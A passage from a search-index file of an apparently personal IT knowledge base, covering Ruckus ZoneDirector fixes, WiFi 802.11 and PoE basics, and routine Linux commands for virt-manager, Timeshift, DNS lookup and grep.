</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Channelization_Ruckus_ZoneDirector_ZD_/#services","title":"Services","text":"<p>Services &amp; Profiles &gt; Services Enable Self Healing</p> <p>Background Scanning &gt; 2700 (45 MIN)</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Channelization_Ruckus_ZoneDirector_ZD_/#extra-sources","title":"extra sources","text":"<ul> <li>Background Scanning</li> <li>ZD1200 ZoneDirector 10.5.1 User Guide</li> <li>ZoneDirector 10.5.1 Release Notes GA Refresh 4</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Ruckus_CrossBreeder_-_Standalone_Automation_Implementation_Steps/","title":"Ruckus CrossBreeder - Standalone Automation Implementation Steps","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Zone_Director_Blank_login_screen/","title":"Zone Director Blank login screen","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Zone_Director_Blank_login_screen/#reported-issue","title":"Reported Issue","text":"<p>If you install an RMA'd ZD and when you login using Firefox, you get a blank page due to old running Firmware on the unit, you will need to follow the step shown below.</p> <p>This solution might not be applicable for ZD 3000, but you can it a try or you can find a another ZD 3000 currently working on another location then login, navigate to the firmware page and try that link instead.</p> <p>Example: [https://X.X.X.X/admin10/login.jsp]</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Zone_Director_Blank_login_screen/#issue-reason","title":"Issue Reason","text":"<p>The reason this issue happens is that the Firmware running on the ZD is too old and you need to upgrade it to fix the problem.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Zone_Director_Blank_login_screen/#important-considerations","title":"Important Considerations","text":"<p>Before running a Firmware Upgrade, you must make sure that you established the proper Firmware version that support all Access Points at the property and then you need to establish the proper Upgrade Path.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Zone_Director_Blank_login_screen/#solution","title":"Solution","text":"<p>Change the link to your ZD with the following path [https://X.X.X.X/admin10/admin_upgrade.jsp]</p> <p>The page might not look exactly like this but that doesn't matter, all you need is to click the Browse and continue with the Firmware upgrade.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Zyxel/Zyxel_MIBs/","title":"Zyxel MIBs","text":"<p>ZYXEL-GS2200-8-MIB</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/","title":"WiFi 802.11","text":"MCS Airtime <p>FCC Rules &amp; Regulations</p> RF Terms Power! <p>Client device</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#mcs-rate-snr-rssi-chart","title":"MCS Rate SNR RSSI Chart","text":"<p>MCS TABLE AND HOW TO USE IT</p> <p>mcsindex The MCS table evaluates the quality of the RF environment- the RF media that devices are working in, which is reflected in every single transmission. Every transmitter device, whether it be an AP or a client, will make an internal decision of which MCS it is going to use. MCS summarizes and categorizes Wi-Fi parameters such as modulation, coding scheme, guard interval, and channel width.  MCS Parameters</p> <ul> <li>High Throughput Modulation and Coding Scheme (HT-MCS)</li> <li>Used by 802.11n. Represented by an integer in the range of 0-76.</li> <li>Very High Throughput Modulation and Coding Scheme (VHT-MCS)</li> <li>Used by 802.11ac. Represented by an integer in the range of 0-9.</li> <li>Modulation Scheme</li> <li>Defines the phase and amplitude required for bit computing, from BPSK to QPSK to 16-QAM, 64-QAM, and 256-QAM.</li> <li>Coding</li> <li>Rate of bits transferred and Forward Error Correction. A 1/2 Coding means two bits are transferred, and one is received. Minimizing the coding scheme would entail sending the data faster while losing robustness.</li> <li>Data Width</li> <li>Specifies the channel used: 20MHz, 40MHz, 80MHz, and 160MHz.</li> <li>Guard Interval</li> <li>Waiting time or pause between each packet transmission. 802.11n has 400ns, and 802.11ac has 800 ns. The smaller the guard interval, the faster the throughput.</li> <li>Minimum SNR and RSSI</li> <li> <p>Determines the minimum SNR and RSSI required for a specific MSC index. Using the MCS Table to determine the MCS index</p> </li> <li> <p>Define the capacity of the client device, such as the data width and Wi-Fi designation.</p> </li> <li>Determine and associate the range of such parameters in the table. For example, an 80MHz wide-capable client and supports 802.11ac. This means the AP and the client can support all data transfer defined by the range of the client device, from 6.5 MCS to 1300 MCS. </li> <li>After determining the MCS index, the client device will send a DHCP request to the radio chipset.</li> <li>The AP\u2019s radio will decode and demodulate the request. If no error occurs, it will send back an ACK with an MCS index supported by the client device. Every transmitter chooses which MCS to use.</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#airtime-utilization","title":"Airtime Utilization","text":"<p>Channel Utilization should not exceed %70, if it goes beyond %80 then there is a big chance something that's not WiFi is interfering.</p> <p>What can cause it? - Application usage - Slow Data Rates - Check device's supported 802.11 - Retransmissions - More Devices - Non-WiFi Interference</p> <p>What to consider? - Lower number of SSIDs can help with improving Airtime Utilization, Try less than 4 SSIDs. Reason is that you have a lot of Management data that will be consuming time instead of actual Data. - Capabilities of device and data rates - Play around with min bss rates on both bands and eliminate legacy device, removing 802.11 or b maybe - min rate 12 Mbps - Channel width 20 or 40 (try to stick with 20MHz Channel width, especially on the 2.4GHz band) Enable extra channels on 5GHz if needed like DFS - AP Placement - Transmit power - Check the MCS Index, Modulation and Coding Index</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#fcc-rules-regulations-24-50-ghz-band-power-watt-dbm-max","title":"FCC Rules &amp; Regulations 2.4 5.0 GHz Band Power Watt dBm Max","text":"<p>click to open PDF in new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-rf-spectrum","title":"WiFi RF Spectrum","text":""},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-24ghz-80211n","title":"WiFi 2.4GHz - 802.11n","text":"<p>2.4 GHz band (802.11b/g/n) in North America, there are 11 channels of 20 MHz size allowed by the FCC. Some or all of channels 12-14 are allowed in some other countries, such as Japan. Unfortunately, the center frequencies of channels 1-13 are only 5 MHz apart, leading to only three non-overlapping channels (1, 6 and 11).</p> <p></p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-5ghz-80211ac","title":"WiFi 5GHz - 802.11ac","text":""},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-6-6e-80211ax","title":"WiFi 6 &amp; 6E - 802.11ax","text":"<p>WiFi 5 vs WiFi 6 </p> <p>Additional resources</p> <ul> <li>WiFi 6GHz Network Discovery click to open PDF in new tab</li> <li>WiFi 6E new Technology Features and Enhancements click to open PDF in new tab</li> <li>Reference Guide 802.11ax click to open PDF in new tab</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#great-sources","title":"Great sources:","text":"<ul> <li>WLAN Professionals</li> <li>CWNP</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-terms","title":"WiFi Terms","text":""},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-frames","title":"WiFi Frames","text":"<p>Some of the WiFi Frames - MAC Frame - Control - Management &gt; Beacon frames - Data</p> <pre><code>Type Value  Type Description    Subtype Value   Subtype Description\n00          Management          0000            Association Request\n00          Management          0001            Association Response\n00          Management          0010            Reassociation Request\n00          Management          0011            Reassociation Response\n00          Management          0100            Probe Request\n00          Management          0101            Probe Response\n00          Management          0110            Timing Advertisement\n00          Management          0111            Reserved\n00          Management          1000            Beacon\n00          Management          1001            ATIM\n00          Management          1010            Disassociation\n00          Management          1011            Authentication\n00          Management          1100            Deauthentication\n00          Management          1101            Action\n00          Management          1110            Action No Ack (NACK)\n00          Management          1111            Reserved\n\n\n01          Control             0000-0001       Reserved\n01          Control             0010            Trigger[3]\n01          Control             0011            TACK\n01          Control             0100            Beamforming Report Poll\n01          Control             0101            VHT/HE NDP Announcement\n01          Control             0110            Control Frame Extension\n01          Control             0111            Control Wrapper\n01          Control             1000            Block Ack Request (BAR)\n01          Control             1001            Block Ack (BA)\n01          Control             1010            PS-Poll\n01          Control             1011            RTS\n01          Control             1100            CTS\n01          Control             1101            ACK\n01          Control             1110            CF-End\n01          Control             1111            CF-End + CF-ACK\n\n\n10          Data                0000            Data\n10          Data                0001            Reserved\n10          Data                0010            Reserved\n10          Data                0011            Reserved\n10          Data                0100            Null (no data)\n10          Data                0101            Reserved\n10          Data                0110            Reserved\n10          Data                0111            Reserved\n10          Data                1000            QoS Data\n10          Data                1001            QoS Data + CF-ACK\n10          Data                1010            QoS Data + CF-Poll\n10          Data                1011            QoS Data + CF-ACK + CF-Poll\n10          Data                1100            QoS Null (no data)\n10          Data                1101            Reserved\n10          Data                1110            QoS CF-Poll (no data)\n10          Data                1111            QoS CF-ACK + CF-Poll (no data)\n11          Extension           0000            DMG Beacon\n11          Extension           0001            S1G Beacon\n11          Extension           0010-1111       Reserved\n</code></pre> <p>for more details about the WiFi frame, check this resource out 802.11 Frame Types and Formats</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#bss-coloring","title":"BSS Coloring","text":"<p>A method for addressing medium contention overhead due to overlapping basic service set (OBSS). BSS color aims to uniquely identify different BSSs even though they are transmitting on the same channel. 802.11ax radios can differentiate between BSSs by adding a number (color) to the PHY and MAC headers. The same color bit indicates an intra-BSS. Different color bits indicate inter-BSS. Inter-BSS detection means that a listening radio may not necessarily have to defer. Adaptive CCA implementation could raise the signal detect (SD) threshold for inter-BSS frames while maintaining a lower threshold for intra-BSS traffic. BSS Color potentially decreases the channel contention problem resulting from existing 4 dB signal detect (SD) thresholds.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#bss-min-rate","title":"BSS Min Rate","text":"<p>Use this option to configure the minimum transmission rate supported by the WLAN. When OFDM Only is enabled, BSS Min Rate offers three options: Default, 12 Mbps, and 24 Mbps. If set to Default, Mgmt Tx rate is fixed at 6 Mbps. This option can also be used to prevent 802.11b clients from connecting, and to allow greater client density with higher data rates.</p> <p>If you have devices that all can do WPA2, use \"ofdm-only\", which will set the management frame min-rate to 6mb and refuse all CCK (802.11b/g only) clients</p> <p>If a device cannot achieve the min bss rate limit, the client device won't be able to connect to the WLAN in that area, they would have to move closer to the AP to get better rates.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#mgmt-tx-rate","title":"Mgmt Tx Rate","text":"<p>Use this setting to configure the rate at which management frames are sent. The default is 2 Mbps. This option is only available if both OFDM Only and BSS Min Rate are disabled. (Otherwise, Mgmt Tx Rate is defined by those settings.)</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#wifi-backhaul","title":"WiFi Backhaul","text":"<p>Imagine you want to connected 2 buildings Network but you don't have the capability or means to run an Ethernet or Fiber cables between the 2 buildings, you can instead use WiFi Access Points to do the job.</p> <p>Using fixed PTP (Point To Point) or PTMP (Point To Multi Point) Access Points you can have two or more buildings Networks connected.</p> <p></p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#80211k","title":"802.11K","text":"<p>Transmit Power Control:  The 802.11h amendment defined the use of transmit power control (TPC) for the 5 GHz band to reduce interference. Under 802.11k, TPC will also be used in other frequency bands and in areas governed by other regulatory agencies.</p> <p>Client Statistics:  Physical layer information, such as signal-to-noise ratio, signal strength, and data rates, can all be reported back to the access point or WLAN controller. MAC information, such as frame transmissions, retries, and errors, may all be reported back to the access point or WLAN controller as well.</p> <p>Channel Statistics:  Clients may gather noise-floor information based on any RF energy in the background of the channel and report this information back to the access point. Channel-load information may also be collected and sent to the AP. The access point or WLAN controller may use this information for channel management decisions.</p> <p>Neighbor Reports:  802.11k gave client stations the ability to learn from access points or WLAN controllers about other access points where the client stations might potentially roam. AP neighbor report information is shared among WLAN devices to improve roaming efficiency.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#80211-r-fast-transition","title":"802.11 r-Fast Transition","text":"<p>The fast basic service set transition (FT) amendment. The technology is more often referred to as fast-secure roaming because it defines faster handoffs when roaming occurs between cells in a WLAN using the strong security 56 Chapter 2 \u25a0 IEEE 802.11 Standard and Amendments defined by a robust secure network (RSN). Be aware that there are multiple types of fastsecure roaming that are implemented by different vendors. These include CCKM, PKC, OKC, and fast session resumption.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#roaming","title":"Roaming","text":"<p>When a device moves through a Hotel and the device is connected to a WiFi network, the connection should seamlessly transition from Access Point to another on the same WLAN.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#poepoe-power-over-ethernet","title":"PoE/PoE+ (Power over Ethernet)","text":"<p>This is a Technology that runs through Ethernet 802.3, the reason I am putting it here is that Wireless Access Point in this day and age get their power through PoE (there are exception though but those are far in between and you end up using something like a PoE Injector or Directly plug the AP into a wall outlet).</p> <p></p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#device-detection-and-negotiation-process","title":"Device detection and negotiation process","text":"<p>This process is determined through either one of the following methods: - Hardware handshake or PoE handshake. There is another s - Software-based negotiation using LLDP (Link Layer Discovery Protocol), which is a L2 [data link layer protocol] for advertising network capabilities. </p> <p></p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#8023af-poe","title":"802.3af PoE","text":"<ul> <li>maximum power of 15.4 watts</li> <li>device type 1</li> <li>2-Pair PoE</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#8023at-poe","title":"802.3at PoE+","text":"<ul> <li>maximum power to 25.5 watts</li> <li>device type 2</li> <li>2-Pair PoE</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#8023bt-upoe-type-3","title":"802.3bt UPoE Type 3","text":"<ul> <li>maximum power up 60 watts</li> <li>4-pair PoE</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#8023bt-upoe-type-4","title":"802.3bt UPoE+ Type 4","text":"<ul> <li>maximum power up to 100 W of DC power (71.3 W to each device)</li> <li>4-pair PoE</li> </ul> <p>Keep in mind that the Switch doesn't provide infinite watts. For example if the Switch specs provides max 300 watts through PoE and it's a 24 port Switch, you cannot connect 24 PoE devices that require 15.4 watts each. It's simple math 24 X 15.4 = 369.2, this exceeds the Switch Maximum Power output. In reality APs don't consume exactly 15.4 watts, this can vary based on AP and demand.</p>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#extra-resources","title":"Extra resources","text":"<ul> <li>Introduction to PoE and the IEEE802.3af and 802.3at Standards</li> <li>Understanding the IEEE 8023bt PoE Standard</li> </ul>"},{"location":"Knowledge_Base/Network/WiFi_802.11/WiFi_802.11/#clients-devices-wifi-capabilities","title":"Clients devices WiFi capabilities","text":"<p>Not all Client devices support the same WiFi Standards you might have configured You can check the Clients devices WiFi capabilities</p> <p>How to tell if a client device is using MAC Randomization - Private Address 2nd significant bit in the most significant octet you set to 1 that means the 2nd character in the mac address can be one of 4</p> <pre><code>X2:XX:XX:XX:XX:XX\nX6:XX:XX:XX:XX:XX\nXA:XX:XX:XX:XX:XX\nXE:XX:XX:XX:XX:XX\n</code></pre>"},{"location":"Knowledge_Base/News/News/","title":"News","text":"<p>This will contain a list of good resources for latest news related to Networking, Tech, Cyber Security.</p> <ul> <li>Bleeping Computer</li> <li>Surveillance Report Website Youtube</li> </ul>"},{"location":"Knowledge_Base/OS/General/Putty_Logging/","title":"Putty Logging","text":"<p><code>Computer\\HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions</code></p> <p>This is reg file contain the settings I use for my putty. If you want to use it, make sure you edit it and update the path <code>%USERPROFILE%\\\\Desktop</code> to where you want to store your files '\"LogFileName\"=\"%USERPROFILE%\\Desktop\\PuttyLog_&amp;H_&amp;M-&amp;D-&amp;Y_&amp;T.log\"' and leave this as is <code>PuttyLog_&amp;H_&amp;M-&amp;D-&amp;Y_&amp;T.log</code>, this is the file naming convention.</p> <p>my_putty_settings.reg</p> <pre><code>C:\\Users\\&lt;user&gt;\\Desktop\\PuttyLogs\\PuttyLog_&amp;H_&amp;M-&amp;D-&amp;Y_&amp;T.log\n\n&amp;H = hostname for the session\n&amp;Y = year\n&amp;M = month\n&amp;D = day\n&amp;T = time\n</code></pre> <p></p> <p>Some font preferences <code>BlexMono Nerd Font Mono 10</code> <code>JetBrainsMono Nerd Font Mono 11</code> <code>Ubuntu Mono 12</code> <code>ShureTechMono</code> <code>Nerd Font Mono 11</code></p> <p></p> <p>Putty Theme</p> <ul> <li>GitHub - AlexAkulov/putty-color-themes: PuTTY Color Themes</li> <li>putty-color-themes/images/readme.md at master \u00b7 AlexAkulov/putty-color-themes \u00b7 GitHub</li> </ul>"},{"location":"Knowledge_Base/OS/General/Putty_Logging/#blazer","title":"Blazer","text":"<p>Blazer.reg</p>"},{"location":"Knowledge_Base/OS/General/Putty_Logging/#ocean","title":"Ocean","text":"<p>Ocean.reg</p>"},{"location":"Knowledge_Base/OS/General/Putty_Logging/#vaughn","title":"Vaughn","text":"<p>Vaughn.reg</p>"},{"location":"Knowledge_Base/OS/Linux/Arch/Arch_Openvpn/","title":"Arch Openvpn","text":"<pre><code>sudo nmcli connection import type openvpn file mullvad_us_mia.conf\n#double check username and password before connecting\nnmcli connection up mullvad_us_mia\nnmcli conn show\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/","title":"virt-manager","text":""},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#virt-manager-network-default-is-not-active","title":"virt manager: \"network 'default' is not active\"","text":"<p>List the available network</p> <pre><code>sudo virsh net-list --all\n</code></pre> <p>In my case it was default, change default if your is different</p> <pre><code>sudo virsh net-start default\n</code></pre> <p>You can create a .sh script with the net-start and have it run on boot up.  </p>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#share-clipboard","title":"share clipboard","text":"<p>Must have installed the following on host and agent &gt; spice-vdagent enable shared memory on VM</p> <pre><code>systemctl enable spice-vdagentd.service\nsystemctl start spice-vdagentd.service\n</code></pre> <p>Create shared folder for vm in virt manager Add hardware &gt; Filesystem &gt; Driver virtiofs set a source path and target path</p> <pre><code>Example source path: /home/penguin/Desktop/VM-share/\nExample Target Path: my-vm-share\n</code></pre> <p>Boot Options &gt; Checked the Auto Start Make sure the VirtIO Disk is checked</p> <p>On host do the below</p> <pre><code>sudo gedit /etc/xdg/autostart/spice-vdagent.desktop\n\nIf you use KDE guest, just remove the line X-GNOME-Autostart-Phase=WindowManager in it. Then reboot.\n</code></pre> <p>pacman will overwrite it back when update or reinstall spice-vdagent.</p> <p>There are possible two solutions:     1- You can create a separate same file in ~/.config/autostart/spice-vdagent.desktop</p> <pre><code>2- Edit /etc/pacman.conf to add\n\n```bash\nNoUpgrade = etc/xdg/autostart/spice-vdagent.desktop\n```\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#enable-multiple-screens","title":"Enable multiple screens","text":"<pre><code>Video QXL &gt; edit the XML part of the in the QEMU machine profile to say \u201cheads=2\u201d instead of \u201cheads=1\u201d, looks something like this\n\n&lt;video&gt;\n  &lt;model type=\"qxl\" ram=\"65536\" vram=\"65536\" vgamem=\"16384\" heads=\"2\" primary=\"yes\"/&gt;\n  &lt;alias name=\"video0\"/&gt;\n  &lt;address type=\"pci\" domain=\"0x0000\" bus=\"0x00\" slot=\"0x01\" function=\"0x0\"/&gt;\n&lt;/video&gt;\n```bash\n\ninstall virt-viewer\n\n```bash\nsudo pacman -S virt-viewer\n</code></pre> <p>to run a vnc session [change the 5900 to the port number you selected]</p> <pre><code>remote-viewer spice://localhost:5900\n</code></pre> <p>Select display 1 &amp; 2, etc...</p>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#screen-auto-resize-fix","title":"screen auto resize fix","text":"<p>install Windows spice agent spice-space</p> <p>Windows binaries section &gt; Windows SPICE Guest Tools (spice-guest-tools)</p> <p>Windows SPICE Guest Tools binary</p> <p>Run the binary on your Windows machine, once done go to the virt manager tool bar View &gt; Scale Display &gt; check the \"Auto resize VM with window\" Now you should be able to see it working as expected</p>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#installing-windows-11-steps-on-virt-manager","title":"Installing windows 11 steps on virt manager","text":"<p>install-a-windows-11-virtual-machine-on-kvm</p>"},{"location":"Knowledge_Base/OS/Linux/Arch/virt-manager/#resources","title":"Resources","text":"<ul> <li>install-virtio-drivers-for-windows-guests</li> <li>mount-the-virtio-winiso-image</li> </ul>"},{"location":"Knowledge_Base/OS/Linux/Arch/xrandr_changing_primary_display/","title":"xrandr changing primary display","text":"<p>If you have multiple displays and want to change which display is the main one</p> <pre><code>#list the displays\nxrandr --listactivemonitors\nMonitors: 3\n0: +*HDMI-1 1920/527x1080/296+1920+1080  HDMI-1\n1: +DP-0 1920/527x1080/296+0+0  DP-0\n2: +HDMI-0 1920/527x1080/296+0+1080  HDMI-0\n\n#example below shows how to change the primary display based on above output\nxrandr --output HDMI-1 --primary\nxrandr --output HDMI-0 --primary\nxrandr --output eDP-1 --primary\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/","title":"Timeshift system snapshots","text":"<p>Timeshift installation</p> <p>Using Timeshift</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#timeshift-installation","title":"Timeshift installation","text":"<pre><code>sudo apt install timeshift\nsudo timeshift --create --comments \"A new backup\" --tags D\nsudo timeshift --restore\n\n-tags D\u00a0stands for Daily Backup\n-tags W\u00a0stands for Weekly Backup\n-tags M\u00a0stands for Monthly Backup\n-tags O\u00a0stands for On-demand Backup\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#using-timeshift","title":"Using Timeshift","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#installing-timeshift","title":"Installing TImeshift","text":"<pre><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys AB19BAC9\nsudo add-apt-repository -y ppa:teejee2008/ppa\nsudo apt-get update\nsudo apt install timeshift\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#creating-a-restore-point","title":"Creating a Restore point","text":"<p>Now, launch your terminal and type the following command <pre><code>sudo timeshift --create --comments \"first backup\"\nRestore Point\n</code></pre></p> <p>(Creating a restore point/snapshot may take several minutes, depends on the size of the files &amp; your hardware resources)</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#writing-a-comment","title":"Writing a comment","text":"<pre><code>-- comments \"A new backup\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#tags","title":"tags","text":"<p>There are several tags, that specify what kind of backup it is. As an example -tags D stands for Daily Backup -tags W stands for Weekly Backup -tags M stands for Monthly Backup -tags O stands for On-demand Backup (default option)</p> <p>You can put any tag as your wish, after the comments</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Timeshift_system_snapshots/#restoring-a-snapshot","title":"Restoring a snapshot","text":"<p><pre><code>sudo timeshift --restore\n</code></pre> This command shows you a list of created snapshots &amp; ask, from which snapshot you want to restore the system, you have to select the snapshot index to proceed further</p> <p>After that, press the Enter key to continue, when It asks about reinstalling the GRUB2 bootloader, press the 'y' key, then press the Enter key again &amp; finally, press the 'y' key to start the system restore...</p> <p>At this moment, you have restored the system successfully, and the PC will take a reboot to ensure that your restoration is fully done.</p> <p>(**When your PC is in the restoring phase, don't do any work. It might interfere with the restoring process.)</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Undo_Deleted_Files/","title":"Undo Deleted Files","text":"<p>foremost</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Backup_and_Restore/Undo_Deleted_Files/#foremost","title":"foremost","text":"<pre><code>sudo apt install foremost -y\n\nExample of use case\nsudo foremost -t pdf -i /dev/vda3\nsudo foremost -t all -i /dev/vda3\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Autostart_apps_scripts_on_startup/","title":"Autostart apps scripts on startup","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Autostart_apps_scripts_on_startup/#initd","title":"init.d","text":"<pre><code>cd /etc/init.d\nsudo nano script.sh\nsudo chmod +x script.sh\n</code></pre> <p>Write your scrip and save Now every time the OS boots it will run all scripts in the init.d</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/","title":"DNS Lookup","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#installing-dnsutils","title":"Installing dnsutils","text":"<pre><code>sudo apt-get install dnsutils\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#dnsutils-tools","title":"dnsutils Tools","text":"<p>When installing dnsutils, you will be able to use the following commands</p> <ul> <li><code>dig</code></li> <li><code>nslookup</code></li> <li><code>nsupdate</code></li> </ul>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#command-syntax","title":"Command syntax","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#dig","title":"dig","text":"<pre><code>dig [server] [name] [type]\ndig [@server] [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-t type] [-x addr] [-y name:key] [-4] [-6] [name] [type] [class] [queryopt...]\n\ndig example.com\ndig example.com MX\ndig example.com SOA\ndig example.com TTL\ndig example.com ANY +noall +answer\n\n#reverse lookup\ndig -x 1.1.1.1 +short\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#nslookup","title":"nslookup","text":"<pre><code>nslookup [-option] [name | -] [server]\n\nnslookup example.com\nnslookup -query=mx example.com\nnslookup -type=soa example.com\nnslookup -type=any example.com\nnslookup -timeout=10 example.com\nnslookup -port 56 example.com\nnslookup -debug example.com\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/DNS_Lookup/#nsupdate","title":"nsupdate","text":"<pre><code>nsupdate [-d] [[-y keyname:secret] | [-k keyfile]] [-t timeout] [-u udptimeout] [-r udpretries] [-v] [filename]\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/","title":"Find Search Locate","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#find-file-in-specific-location","title":"Find file in specific location","text":"<p>Change location /opt/ Change what you are searching for, file name \"go.d.plugin\u201d</p> <pre><code>sudo find -O3 -L /opt/ -name \"go.d.plugin\u201d\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#using-grep-to-find-txt-in-files","title":"Using grep to find txt in files","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-for-word-in-file","title":"Search for word in file","text":"<p>For case insensitive use -i</p> <pre><code>grep WORD file.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-case-insensitive-word-in-file-type","title":"Search case insensitive Word in file type","text":"<pre><code>grep -i WORD *.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-case-insensitive-word-in-any-file-type","title":"Search case insensitive Word in ANY file type","text":"<pre><code>grep -i WORD *\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#recursion","title":"RECURSION","text":"<pre><code>-r, --recursive\n        Read all files under each directory, recursively, following symbolic  links only if they are on the command line.\n        Note that if no file operand is given, grep searches the working directory.  This is equivalent to the -d recurse option.\n\n-R, --dereference-recursive\n        Read  all  files under each directory, recursively. Follow all symbolic links, unlike -r.\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-recursively-for-word-starting-current-directory","title":"Search recursively for word starting current directory","text":"<pre><code>grep -r Word .\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#for-case-insensitive","title":"For case insensitive","text":"<pre><code>grep -ir Word .\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-recursively-for-word-starting-in-a-specific-directory","title":"Search recursively for word starting in a specific directory","text":"<pre><code>grep -r Word /path..\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#for-case-insensitive_1","title":"For case insensitive","text":"<pre><code>grep -ir Word /path..\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-recursively-for-word-starting-current-directory-and-in-a-specific-file-type","title":"Search recursively for word starting current directory and in a specific file type","text":"<pre><code>grep -ir --include=\"*.txt\" Word .\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#search-recursively-for-sentence-starting-current-directory","title":"Search recursively for sentence starting current directory","text":"<pre><code>grep -ri \"Word after word\" .\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Commands/Find_Search_Locate/#using-locate","title":"Using Locate","text":"<p>Run the update before using locate to make sure you get accurate results</p> <pre><code>locate 